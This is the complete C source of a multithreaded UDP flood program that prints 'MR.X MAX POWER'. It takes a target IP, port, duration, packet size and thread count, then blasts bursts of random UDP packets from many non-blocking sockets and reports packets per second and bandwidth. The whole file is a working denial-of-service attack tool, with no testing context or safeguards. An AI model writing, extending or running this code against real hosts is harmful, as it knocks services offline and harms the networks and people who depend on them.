#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <fcntl.h>
#include <sys/time.h>
#include <errno.h>

char *TARGET_IP;
int TARGET_PORT;
int DURATION_TIME;
int PACKET_SIZE;
int THREAD_COUNT;

volatile unsigned long long total_packets = 0;
volatile unsigned long long total_bytes = 0;
volatile int running = 1;
volatile int attack_started = 0;
pthread_t monitor_tid;
pthread_mutex_t start_mutex = PTHREAD_MUTEX_INITIALIZER;
pthread_cond_t start_cond = PTHREAD_COND_INITIALIZER;

#define MAX_SOCKETS 8
#define BUFFER_COUNT 128
#define BURST_SIZE 25000
#define STATS_UPDATE 15000

int create_max_socket(int tid, int sid) {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return -1;
    
    int sndbuf = 2147483647;
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
    
    int opt = 1;
    setsockopt(sock, SOL_SOCKET, SO_BROADCAST, &opt, sizeof(opt));
    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    
    #ifdef SO_NO_CHECK
    setsockopt(sock, SOL_SOCKET, SO_NO_CHECK, &opt, sizeof(opt));
    #endif
    
    fcntl(sock, F_SETFL, O_NONBLOCK);
    
    struct sockaddr_in local;
    memset(&local, 0, sizeof(local));
    local.sin_family = AF_INET;
    local.sin_addr.s_addr = INADDR_ANY;
    local.sin_port = htons(40000 + (tid * 50) + sid);
    bind(sock, (struct sockaddr*)&local, sizeof(local));
    
    return sock;
}

void make_packet(char* pkt, int size, int seed) {
    unsigned int r = seed;
    for (int i = 0; i < size; i++) {
        r = r * 1103515245 + 12345;
        pkt[i] = (r >> 16) & 0xFF;
    }
}

void* max_power_thread(void* arg) {
    int tid = *(int*)arg;
    
    pthread_mutex_lock(&start_mutex);
    while (!attack_started) {
        pthread_cond_wait(&start_cond, &start_mutex);
    }
    pthread_mutex_unlock(&start_mutex);
    
    int socks[MAX_SOCKETS];
    int sock_count = 0;
    
    for (int i = 0; i < MAX_SOCKETS; i++) {
        socks[i] = create_max_socket(tid, i);
        if (socks[i] > 0) sock_count++;
    }
    
    if (sock_count == 0) return NULL;
    
    struct sockaddr_in target;
    memset(&target, 0, sizeof(target));
    target.sin_family = AF_INET;
    target.sin_port = htons(TARGET_PORT);
    target.sin_addr.s_addr = inet_addr(TARGET_IP);
    
    char* bufs[BUFFER_COUNT];
    for (int i = 0; i < BUFFER_COUNT; i++) {
        bufs[i] = malloc(PACKET_SIZE);
        make_packet(bufs[i], PACKET_SIZE, (tid * 1000) + i);
    }
    
    time_t start = time(NULL);
    unsigned long long local_pkts = 0;
    unsigned long long local_bytes = 0;
    
    int buf_idx = 0;
    int sock_idx = 0;
    int pkts_since = 0;
    
    struct timeval tv_start, tv_now;
    gettimeofday(&tv_start, NULL);
    
    while (running && (time(NULL) - start) < DURATION_TIME) {
        for (int burst = 0; burst < 100; burst++) {
            for (int pkt = 0; pkt < BURST_SIZE; pkt++) {
                sendto(socks[sock_idx], bufs[buf_idx], PACKET_SIZE,
                       MSG_DONTWAIT | MSG_NOSIGNAL,
                       (struct sockaddr*)&target, sizeof(target));
                
                local_pkts++;
                local_bytes += PACKET_SIZE;
                pkts_since++;
                
                buf_idx = (buf_idx + 1) % BUFFER_COUNT;
                sock_idx = (sock_idx + 1) % sock_count;
                
                if (pkts_since >= STATS_UPDATE) {
                    __sync_fetch_and_add(&total_packets, STATS_UPDATE);
                    __sync_fetch_and_add(&total_bytes, STATS_UPDATE * PACKET_SIZE);
                    local_pkts -= STATS_UPDATE;
                    local_bytes -= STATS_UPDATE * PACKET_SIZE;
                    pkts_since = 0;
                }
            }
        }
        
        gettimeofday(&tv_now, NULL);
        long elapsed_us = (tv_now.tv_sec - tv_start.tv_sec) * 1000000 + 
                         (tv_now.tv_usec - tv_start.tv_usec);
        
        if (elapsed_us < 10000000) {
            
        } else if (elapsed_us < 30000000) {
            usleep(50);
        } else {
            usleep(100);
        }
    }
    
    if (local_pkts > 0) {
        __sync_fetch_and_add(&total_packets, local_pkts);
        __sync_fetch_and_add(&total_bytes, local_bytes);
    }
    
    for (int i = 0; i < BUFFER_COUNT; i++) {
        free(bufs[i]);
    }
    
    for (int i = 0; i < sock_count; i++) {
        close(socks[i]);
    }
    
    return NULL;
}

void print_k(unsigned long long v, char* buf) {
    if (v < 1000) sprintf(buf, "%llu", v);
    else if (v < 1000000) sprintf(buf, "%.1fK", v/1000.0);
    else sprintf(buf, "%.1fM", v/1000000.0);
}

void* monitor(void* arg) {
    unsigned long long last_pkts = 0, last_bytes = 0;
    time_t start = time(NULL);
    
    while (running) {
        sleep(1);
        
        unsigned long long curr_pkts = total_packets;
        unsigned long long curr_bytes = total_bytes;
        time_t elapsed = time(NULL) - start;
        
        unsigned long long pps = curr_pkts - last_pkts;
        unsigned long long bps = (curr_bytes - last_bytes) * 8;
        double mbps = bps / 1000000.0;
        unsigned long long avg_pps = elapsed > 0 ? curr_pkts / elapsed : 0;
        
        char pps_str[32], total_str[32], avg_str[32];
        print_k(pps, pps_str);
        print_k(curr_pkts, total_str);
        print_k(avg_pps, avg_str);
        
        fprintf(stderr, "MR.X: %s pkts | %s pps | %s avg | %.1f Mbps | %lds\n",
                total_str, pps_str, avg_str, mbps, elapsed);
        
        last_pkts = curr_pkts;
        last_bytes = curr_bytes;
    }
    return NULL;
}

int check_ip(char* ip) {
    struct in_addr a;
    return inet_pton(AF_INET, ip, &a) == 1;
}

int main(int argc, char* argv[]) {
    if (argc != 6) {
        fprintf(stderr, "Use: ./mrx_max IP PORT TIME SIZE THREADS\n");
        return 1;
    }
    
    TARGET_IP = argv[1];
    TARGET_PORT = atoi(argv[2]);
    DURATION_TIME = atoi(argv[3]);
    PACKET_SIZE = atoi(argv[4]);
    THREAD_COUNT = atoi(argv[5]);
    
    if (!check_ip(TARGET_IP) || TARGET_PORT == 0) {
        fprintf(stderr, "Invalid\n");
        return 1;
    }
    
    printf("MR.X MAX POWER\n");
    
    pthread_create(&monitor_tid, NULL, monitor, NULL);
    
    pthread_t* threads = malloc(THREAD_COUNT * sizeof(pthread_t));
    int* tids = malloc(THREAD_COUNT * sizeof(int));
    
    for (int i = 0; i < THREAD_COUNT; i++) {
        tids[i] = i;
        pthread_create(&threads[i], NULL, max_power_thread, &tids[i]);
    }
    
    sleep(1);
    
    pthread_mutex_lock(&start_mutex);
    attack_started = 1;
    pthread_cond_broadcast(&start_cond);
    pthread_mutex_unlock(&start_mutex);
    
    sleep(DURATION_TIME);
    running = 0;
    
    for (int i = 0; i < THREAD_COUNT; i++) {
        pthread_join(threads[i], NULL);
    }
    
    pthread_join(monitor_tid, NULL);
    
    double avg_pps = (double)total_packets / DURATION_TIME;
    double avg_mbps = (total_bytes * 8.0) / (DURATION_TIME * 1000000.0);
    
    char total_str[32], pps_str[32];
    print_k(total_packets, total_str);
    print_k((unsigned long long)avg_pps, pps_str);
    
    fprintf(stderr, "MR.X FINAL: %s pkts | %s pps | %.1f Mbps | %ds\n",
            total_str, pps_str, avg_mbps, DURATION_TIME);
    
    printf("MR.X DONE\n");
    
    free(threads);
    free(tids);
    
    return 0;
}